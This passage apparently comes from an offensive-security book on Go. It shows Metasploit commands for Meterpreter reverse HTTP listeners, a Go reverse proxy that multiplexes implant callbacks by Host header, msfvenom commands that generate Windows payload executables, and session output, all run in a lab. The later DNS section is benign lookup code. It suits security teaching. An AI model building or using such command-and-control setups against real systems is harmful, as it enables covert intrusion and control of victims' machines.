form domain fronting, a technique for leveraging trusted third-party domains 
(often from cloud providers) to bypass restrictive egress controls. We won’t go 
into a full-fledged example here, but we highly recommend you dig into it, as 
it can be pretty powerful, allowing you to egress restricted networks. Lastly, 
the use case demonstrates how you can share a single host/port combination 
among a team of allies potentially attacking different target organizations. 
Since ports 80 and 443 are the most likely allowed egress ports, you can use 
your proxy to listen on those ports and intelligently route the connections to 
the correct listener.
Here’s the plan. You’ll set up two separate Meterpreter reverse HTTP 
listeners. In this example, these will reside on a virtual machine with an IP 
前沿信安资讯阵地  公众号：i nf osrc
HTTP Servers, Routing, and Middleware    99
address of 10.0.1.20, but they could very well exist on separate hosts. You’ll 
bind your listeners to ports 10080 and 20080, respectively. In a real situ-
ation, these listeners can be running anywhere so long as the proxy can 
reach those ports. Make sure you have Metasploit installed (it comes pre-
installed on Kali Linux); then start your listeners.
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter_reverse_http
u > set LHOST 10.0.1.20
> set LPORT 80
v > set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 10080
> exploit -j -z
[*] Exploit running as background job 1.
[*] Started HTTP reverse handler on http://10.0.1.20:10080
When you start your listener, you supply the proxy data as the LHOST 
and LPORT values u. However, you set the advanced options ReverseListener 
BindAddress and ReverseListenerBindPort to the actual IP and port on which 
you want the listener to start v. This gives you some flexibility in port usage 
while allowing you to explicitly identify the proxy host—which may be a 
hostname, for example, if you were setting up domain fronting. 
On a second instance of Metasploit, you’ll do something similar to start 
an additional listener on port 20080. The only real difference here is that 
you’re binding to a different port: 
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter_reverse_http
> set LHOST 10.0.1.20
> set LPORT 80
> set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 20080
> exploit -j -z
[*] Exploit running as background job 1.
[*] Started HTTP reverse handler on http://10.0.1.20:20080
Now, let’s create your reverse proxy. Listing 4-10 shows the code in 
its entirety.
package main
import (
    "log"
    "net/http"
    u "net/http/httputil"
    "net/url"
前沿信安资讯阵地  公众号：i nf osrc
100   Chapter 4
    "github.com/gorilla/mux"
)
v var (
    hostProxy = make(map[string]string)
    proxies   = make(map[string]*httputil.ReverseProxy)
)
func init() {
    w hostProxy["attacker1.com"] = "http://10.0.1.20:10080"
    hostProxy["attacker2.com"] = "http://10.0.1.20:20080"
    for k, v := range hostProxy {
        x remote, err := url.Parse(v)
        if err != nil {
            log.Fatal("Unable to parse proxy target")
        }   
        y proxies[k] = httputil.NewSingleHostReverseProxy(remote)
    }   
}
func main() {
    r := mux.NewRouter()
    for host, proxy := range proxies {
        z r.Host(host).Handler(proxy)
    }   
    log.Fatal(http.ListenAndServe(":80", r)) 
}
Listing 4-10: Multiplexing Meterpreter (/ch-4 /multiplexer /main.go)
First off, you’ll notice that you’re importing the net/http/httputil pack-
age u, which contains functionality to assist with creating a reverse proxy. 
It’ll save you from having to create one from scratch.
After you import your packages, you define a pair of variables v. Both 
variables are maps. You’ll use the first, hostProxy, to map hostnames to the 
URL of the Metasploit listener to which you’ll want that hostname to route. 
Remember, you’ll be routing based on the Host header that your proxy 
receives in the HTTP request. Maintaining this mapping is a simple way 
to determine destinations. 
The second variable you define, proxies, will also use hostnames as its 
key values. However, their corresponding values in the map are *httputil 
.ReverseProxy instances. That is, the values will be actual proxy instances to 
which you can route, rather than string representations of the destination. 
Notice that you’re hardcoding this information, which isn’t the most 
elegant way to manage your configuration and proxy data. A better imple-
mentation would store this information in an external configuration file 
instead. We’ll leave that as an exercise for you.
前沿信安资讯阵地  公众号：i nf osrc
HTTP Servers, Routing, and Middleware    101
You use an init() function to define the mappings between domain 
names and destination Metasploit instances w. In this case, you’ll route 
any request with a Host header value of attacker1.com to http://10.0.1.20 
:10080 and anything with a Host header value of attacker2.com to http:// 
10.0.1.20:20080. Of course, you aren’t actually doing the routing yet; you’re 
just creating your rudimentary configuration. Notice that the destinations 
correspond to the ReverseListenerBindAddress and ReverseListenerBindPort 
values you used for your Meterpreter listeners earlier. 
Next, still within your init() function, you loop over your hostProxy 
map, parsing the destination addresses to create net.URL instances x. You 
use the result of this as input into a call to httputil.NewSingleHostReverseProxy 
(net.URL) y, which is a helper function that creates a reverse proxy from a 
URL. Even better, the httputil.ReverseProxy type satisfies the http.Handler 
interface, which means you can use the created proxy instances as handlers 
for your router. You do this within your main() function. You create a router 
and then loop over all of your proxy instances. Recall that the key is the 
hostname, and the value is of type httputil.ReverseProxy. For each key/value 
pair in your map, you add a matching function onto your router z. The 
Gorilla MUX toolkit’s Route type contains a matching function named Host 
that accepts a hostname to match Host header values in incoming requests 
against. For each hostname you want to inspect, you tell the router to use 
the corresponding proxy. It’s a surprisingly easy solution to what could 
other wise be a complicated problem. 
Your program finishes by starting the server, binding it to port 80. Save 
and run the program. You’ll need to do so as a privileged user since you’re 
binding to a privileged port.
At this point, you have two Meterpreter reverse HTTP listeners run-
ning, and you should have a reverse proxy running now as well. The last 
step is to generate test payloads to check that your proxy works. Let’s use 
msfvenom, a payload generation tool that ships with Metasploit, to generate 
a pair of Windows executable files:
$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 
HttpHostHeader=attacker1.com -f exe -o payload1.exe
$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 
HttpHostHeader=attacker2.com -f exe -o payload2.exe
This generates two output files named payload1.exe and payload2.exe. 
Notice that the only difference between the two, besides the output filename, 
is the HttpHostHeader values. This ensures that the resulting payload sends its 
HTTP requests with a specific Host header value. Also of note is that the LHOST 
and LPORT values correspond to your reverse proxy information and not your 
Meterpreter listeners. Transfer the resulting executables to a Windows sys-
tem or virtual machine. When you execute the files, you should see two new 
前沿信安资讯阵地  公众号：i nf osrc
102   Chapter 4
sessions established: one on the listener bound to port 10080, and one on the 
listener bound to port 20080. They should look something like this:
> 
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Redirecting stageless 
connection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-3UdLhACr8-Qt6QOlOw 
PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA 'Mozilla/5.0 (Windows NT 6.1; 
Trident/7.0; 
rv:11.0) like Gecko' 
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Attaching 
orphaned/stageless session... 
[*] Meterpreter session 1 opened (10.0.1.20:10080 -> 10.0.1.20:60226) at 2020-07-03 16:13:34 -0500
If you use tcpdump or Wireshark to inspect network traffic destined 
for port 10080 or 20080, you should see that your reverse proxy is the only 
host communicating with the Metasploit listener. You can also confirm 
that the Host header is set appropriately to attacker1.com (for the listener on 
port 10080) and attacker2.com (for the listener on port 20080).
That’s it. You’ve done it! Now, take it up a notch. As an exercise for you, 
we recommend you update the code to use a staged payload. This likely 
comes with additional challenges, as you’ll need to ensure that both stages 
are properly routed through the proxy. Further, try to implement it by using 
HTTPS instead of cleartext HTTP. This will further your understanding 
and effectiveness at proxying traffic in useful, nefarious ways.
Summary
You’ve completed your journey of HTTP, working through both client and 
server implementations over the last two chapters. In the next chapter, 
you’ll focus on DNS, an equally useful protocol for security practitioners. 
In fact, you’ll come close to replicating this HTTP multiplexing example 
using DNS.
前沿信安资讯阵地  公众号：i nf osrc
The Domain Name System (DNS) locates 
internet domain names and translates 
them to IP addresses. It can be an effective 
weapon in the hands of an attacker, because 
organizations commonly allow the protocol to egress 
restricted networks and they frequently fail to monitor
its use adequately. It takes a little knowledge, but savvy attackers can leverage 
these issues throughout nearly every step of an attack chain, including 
reconnaissance, command and control (C2), and even data exfiltration. In 
this chapter, you’ll learn how to write your own utilities by using Go and 
third-party packages to perform some of these capabilities.
You’ll start by resolving hostnames and IP addresses to reveal the many 
types of DNS records that can be enumerated. Then you’ll use patterns 
illustrated in earlier chapters to build a massively concurrent subdomain-
guessing tool. Finally, you’ll learn how to write your own DNS server and 
proxy, and you’ll use DNS tunneling to establish a C2 channel out of a 
restrictive network! 
5
E X PL O I T ING DN S
前沿信安资讯阵地  公众号：i nf osrc
104   Chapter 5
Writing DNS Clients
Before exploring programs that are more complex, let’s get acquainted with 
some of the options available for client operations. Go’s built-in net package 
offers great functionality and supports most, if not all, record types. The 
upside to the built-in package is its straightforward API. For example, 
LookupAddr(addr string) returns a list of hostnames for a given IP address. 
The downside of using Go’s built-in package is that you can’t specify the 
destination server; instead, the package will use the resolver configured 
on your operating system. Another downside is that you can’t run deep 
inspection of the results. 
To get around this, you’ll use an amazing third-party package called the 
Go DNS package written by Miek Gieben. This is our preferred DNS package 
because it’s highly modular, well written, and well tested. Use the following 
to install this package:
$ go get github.com/miekg/dns
Once the package is installed, you’re ready to follow along with the 
upcoming code examples. You’ll begin by performing A record lookups 
in order to resolve IP addresses for hostnames.
Retrieving A Records
Let’s start by performing a lookup for a fully qualified domain name (FQDN), 
which specifies a host’s exact location in the DNS hierarchy. Then we’ll 
attempt to resolve that FQDN to an IP address, using a type of DNS record 
called an A record. We use A records to point a domain name to an IP 
address. Listing 5-1 shows an example lookup. (All the code listings at the 
root location of / exist under the provided github repo https://github.com/
blackhat-go/bhg/.)
package main
import (
    "fmt"
    "github.com/miekg/dns"
)
func main() {
    u var msg dns.Msg
    v fqdn := dns.Fqdn("stacktitan.com")
    w msg.SetQuestion(fqdn, dns.TypeA)
    x dns.Exchange(&msg, "8.8.8.8:53")
}
Listing 5-1: Retrieving an A record (/ch-5/get_a /main.go)
前沿信安资讯阵地  公众号：i nf osrc
Exploiting DNS   105
Start by creating a new Msg u and then call fqdn(string) to transform 
the domain into a FQDN that can be exchanged with a DNS server v. Next, 
modify the internal state of the Msg with a call to SetQuestion(string, uint16) 
by using the TypeA value to denote your intent to look up an A record w. 
(This is a const defined in the package. You can view the other supported 
values in the package documentation.) Finally, place a call to Exchange(*Msg, 
string) x in order to send the message to the provided server address, 
which is a DNS server operated by Google in this case.
As you can probably tell, this code isn’t very useful. Although you’re 
sending a query to a DNS server and asking for the A record, you aren’t 
processing the answer; you aren’t doing anything meaningful with the 
result. Prior to programmatically doing that in Go, let’s first review what 
the DNS answer looks like so that we can gain a deeper understanding 
of the protocol and the different query types. 
Before you execute the program in Listing 5-1, run a packet analyzer, 
such as Wireshark or tcpdump, to view the traffic. Here’s an example of 
how you might use tcpdump on a Linux host:
$ sudo tcpdump -i eth0 -n udp port 53
In a separate terminal window, compile and execute your program 
like this:
$ go run main.go
Once you execute your code, you should see a connection to 8.8.8.8 
over UDP 53 in the output from your packet capture. You should also see 
details about the DNS protocol, as shown here:
$ sudo tcpdump -i eth0 -n udp port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes
23:55:16.523741 IP 192.168.7.51.53307 > 8.8.8.8.53:u 25147+ A?v stacktitan.com. (32)
23:55:16.650905 IP 8.8.8.8.53 > 192.168.7.51.53307: 25147 1/0/0 A 104.131.56.170 (48) w
The packet capture output produces a couple of lines that require fur-
ther explanation. First, a query is being placed from 192.168.7.51 to 8.8.8.8 
by using UDP 53 u while requesting a DNS A record v. The response w is 
returned from Google’s 8.8.8.8 DNS server, which contains the resolved IP 
address, 104.131.56.170. 
Using a packet analyzer such as tcpdump, you’re able to resolve the 
domain name stacktitan.com to an IP address. Now let’s take a look at how 
to extract that information by using Go.
前沿信安资讯阵地  公众号：i nf osrc
106   Chapter 5
Processing Answers from a Msg struct
The returned values from Exchange(*Msg, string) are (*Msg, error). Returning 
the error type makes sense and is common in Go idioms, but why does it 
return *Msg if that’s what you passed in? To clarify this, look at how the 
struct is defined in the source:
type Msg struct {
    MsgHdr
    Compress    bool       `json:"-"` // If true, the message will be compressed...
    u Question    []Question            // Holds the RR(s) of the question section.
    v Answer      []RR                  // Holds the RR(s) of the answer section.
    Ns          []RR                  // Holds the RR(s) of the authority section.
    Extra       []RR                  // Holds the RR(s) of the additional section.
}
As you can see, the Msg struct holds both questions and answers. This lets 
you consolidate all your DNS questions and their answers into a single, unified 
structure. The Msg type has various methods that make working with the data 
easier. For example, the Question slice u is being modified with the convenience 
method SetQuestion(). You could modify this slice directly by using append() and 
achieve the same outcome. The Answer slice v holds the response to the queries 
and is of type RR. Listing 5-2 demonstrates how to process the answers.
package main
import (
    "fmt"
    "github.com/miekg/dns"
)
func main() {
    var msg dns.Msg
    fqdn := dns.Fqdn("stacktitan.com")
    msg.SetQuestion(fqdn, dns.TypeA)
    u in, err := dns.Exchange(&msg, "8.8.8.8:53")
    if err != nil {
        panic(err)
    }
    v if len(in.Answer) < 1 {
        fmt.Println("No records")
        return
    }
    for _, answer := range in.Answer {
        if aw, ok:= answer.(*dns.A)x; ok {
            y fmt.Println(a.A)
        }
    }
}
Listing 5-2: Processing DNS answers (/ch-5/get_all_a /main.go)
前沿信安资讯阵地  公众号：i nf osrc
Exploiting DNS   107
Our example begins by storing the values returned from Exchange, 
checking whether there was an error, and if so, calling panic() to stop the 
program u. The panic() function lets you quickly see the stack trace and 
identify where the error occurred. Next, validate that the length of the 
Answer slice is at least 1 v, and if it isn’t, indicate that there are no records 
and immediately return—after all, there will be legitimate instances when 